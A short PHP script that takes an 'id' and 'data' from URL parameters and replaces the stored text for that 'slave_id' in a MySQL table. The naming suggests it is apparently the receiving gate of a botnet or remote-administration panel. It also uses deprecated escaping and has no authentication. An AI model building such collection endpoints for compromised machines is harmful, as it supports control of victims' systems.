<?
include("../includes/configuration.inc.php");
include("../includes/mysql_connect.inc.php");
//-------------------------------------------
if(isset($_GET['client']))
{
$slave_id = $_GET['id'];
$data = $_GET['data'];
$data = mysql_escape_string($data);
$slave_id = mysql_escape_string($slave_id);
//--------------------------------------
$delete_data = "DELETE FROM data WHERE slave_id='$slave_id'";
mysql_query($delete_data, $connect);
$add_data = "INSERT INTO  data (slave_id, text)
VALUES ('$slave_id', '$data')";
mysql_query($add_data, $connect);
}
?>